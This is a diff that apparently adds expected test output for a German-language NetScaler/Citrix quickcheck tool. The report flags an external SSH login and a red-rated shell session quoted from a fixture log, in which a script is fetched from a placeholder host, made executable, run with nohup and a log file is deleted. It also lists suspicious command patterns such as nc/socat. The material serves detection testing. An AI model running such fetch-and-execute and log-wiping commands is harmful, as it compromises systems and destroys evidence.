@@ -1,0 +1,71 @@
+ns_quickcheck V  host=gw-01  modus=offline  fenster=1000000h  regeln=2026-11-05d  cli=none  TS
+Quelle: REPO/docs/testdata/fixtures/shell
+Whitelist: nicht vorhanden (REPO/ns_quickcheck.whitelist); alle Befunde ungefiltert
+
+== 1 Build ==
+  [OK]    Build 14.1-73.49 enthaelt alle 13 Fix(es) fuer 14.1 der Regeldatei
+  [INFO]  Letzter Boot: 2026-10-06 12:55 (N Tage)
+
+== 2 Exposure ==
+  [OK]    Kein SAML SP/IdP - SAML-abhaengige CVEs nicht relevant
+  [INFO]  DTLS an 1 Gateway-vServer aktiv (CVE-2026-88772-Voraussetzung; auf gefixtem Build mitigiert)
+  [OK]    Enhanced ISN Generation aktiv
+  [INFO]  Management-Portal: NSIP nicht aus der ns.conf bestimmbar, ACL-Mitigation (CTX697263) nicht geprueft
+
+== 3 Mitigation ==
+  [INFO]  Keine Mitigation-Policy gefunden (auf gefixtem Build ohne Spuren nicht erforderlich)
+
+== 4 Angriffsspuren (letzte 1000000h) ==
+  [INFO]  nsprofmon_mgmt.pl-Zeilen (CPU-Momentaufnahmen mit Prozess-Kommandozeilen) vorab abgezweigt: 1; sie werden nur noch auf verdaechtige Prozesse geprueft, damit der Quickcheck sich nicht selbst findet
+  [INFO]  Gelesene Logs im Fenster: ns.log/nsvpn/messages/notice 1, httpaccess 1, httperror 0, auth.log 1, httpaccess.log (Management) 1, cron 0 Datei(en)
+  [OK]    Keine Injection-Muster in Logon-Zeilen der letzten 1000000h
+  [OK]    Keine Abstuerze im Fenster (Pitboss, Kernel, Apache-Fehlerlog, /var/core)
+  [OK]    Keine verdaechtigen Prozesse in den CPU-Momentaufnahmen
+  [INFO]  Webserver-Fehlerlog nicht geprueft: keine httperror*-Datei im Fenster (1000000h)
+  [OK]    Management-Ebene (NITRO, GUI) nur von internen Adressen angesprochen
+  [GELB]  SSH-Anmeldungen von Adressen ausserhalb RFC 1918 und MGMT_NET_RE:
+          | nsroot von 203.0.113.88
+          | Zu tun:        1. Sind das eure Admin-Arbeitsplaetze oder Sprungserver? Dann MGMT_NET_RE setzen. 2. Sonst Passwort des Kontos aendern, Sitzungen pruefen, Adresse sperren und eintragen.
+          | Log:           REPO/docs/testdata/fixtures/shell/var/log/auth.log (2)
+  [OK]    Keine Gateway-Anmeldefehler im Fenster
+  [ROT]   1 Shell-Sitzung(en) mit verdaechtigen Befehlen (Download, chmod +x, base64, nohup, Interpreter, crontab, Log loeschen, Schreiben in Web-Verzeichnisse, Start aus /tmp, nc/socat):
+          | 2026-10-07 14:30 bis 14:31  root@/dev/pts/1  Shell-PID 2002  5 Befehl(e)  Anmeldung davor: nsroot von 203.0.113.88
+          |     fetch hxxp://203.0.113.99/x.sh
+          |     chmod +x x.sh
+          |     nohup ./x.sh _
+          |     rm -f /var/log/bash.log.0.gz
+          | Zu tun:        Befehle oben gegen das Change-Protokoll pruefen; unbekannt = Incident-Prozess, Appliance isolieren, /var/log/bash.log und /var/core sichern, Citrix Support.
+  [GELB]  Shell-Sitzung(en) nach Anmeldung von Adressen ausserhalb RFC 1918 und MGMT_NET_RE: 203.0.113.88 
+  [INFO]  Shell-Sitzungen im Fenster: 3 (root (3) ); Befehle vollstaendig im Report
+          | 2026-10-07 09:00 bis 09:00  root@/dev/pts/0  Shell-PID 1001  2 Befehl(e)  Anmeldung davor: nsroot von 10.10.0.5
+          | 2026-10-07 14:30 bis 14:31  root@/dev/pts/1  Shell-PID 2002  5 Befehl(e)  Anmeldung davor: nsroot von 203.0.113.88
+          | 2026-10-08 08:15 bis 08:15  root@/dev/ttyu0  Shell-PID 3003  1 Befehl(e)  Anmeldung davor: - von -
+          |     root@/dev/pts/0: ls -l
+          |     root@/dev/pts/0: tail -5 /var/log/ns.log
+          |     root@/dev/pts/1: cd /var/tmp
+          |     root@/dev/pts/1: fetch hxxp://203.0.113.99/x.sh
+          |     root@/dev/pts/1: chmod +x x.sh
+          |     root@/dev/pts/1: nohup ./x.sh _
+          |     root@/dev/pts/1: rm -f /var/log/bash.log.0.gz
+          |     root@/dev/ttyu0: df -h
+          | Log:           REPO/docs/testdata/fixtures/shell/var/log/bash.log (8)
+
+== 5 Kompromittierungs-Schnellcheck ==
+  [INFO]  Monitor-Script laeuft unter dem Stock-Daemon (PID 4410, Parent: /netscaler/monuploadd monuploadd -P ) - regulaerer Mechanismus
+  [OK]    Keine sicherheitsrelevanten Aenderungen zwischen ns.conf.0 und ns.conf
+
+== 6 Verdict ==
+ACTION: FORENSICS_FIRST
+Kompromittierungszeichen gefunden. Nicht rebooten, nicht upgraden, bevor gesichert ist:
+  1. Appliance isolieren (Failover auf gepatchten Knoten oder Firewall), HA-File-Sync pruefen, Peer ebenfalls pruefen.
+  2. Sichern: show techsupport, /var/log, /var/core, die genannten Dateien, RAM wenn moeglich (CTX694799).
+  3. Citrix Support einbinden, offiziellen IoC-Scan anfordern. Danach Rebuild, alle Secrets inkl. KEK rotieren, Zertifikate widerrufen.
+
+Adressen dieses Laufs, aufgenommen in ns_quickcheck_observed_ips.tsv:
+  203.0.113.88       shell_source           neu                              Sperrliste: nein
+  203.0.113.88       ssh_login_external     neu                              Sperrliste: nein
+  2 Eintrag/Eintraege; reine Liste ohne vertraute Adressen: grep -v '^#' ns_quickcheck_observed_ips.tsv | grep -v '^trusted_' | cut -f2 | sort -u
+
+
+Erstellt mit netscaler-quickcheck V (Regelstand 2026-11-05d), Apache 2.0, ceterion AG: ceterion.com/netscaler-quickcheck
+RESULT host=gw-01 build=14.1-73.49 mode=offline cli=none window=1000000h saml=0 vuln96=0 vuln_open=0 vuln63=0 vuln79=0 isn_open=0 traces=1 mitigation=0 unsaved=0 save_missing=0 compromise=1 red=1 yellow=2 orange=0 blocked_seen=0 trusted_seen=0 shell_sessions=3 shell_suspect=1 crashes=0 new=0 gone=0 lang=de coverage=full action=FORENSICS_FIRST rules=2026-11-05d script_sha256=X rules_sha256=16e84e91f227cb1eb8fe173de573a04096e3ddae248665a2b995bfe5dc48cb44 msg_sha256=X custom=none custom_sha256=none cve_custom=0 cve_conflict=0 runtime=Ns
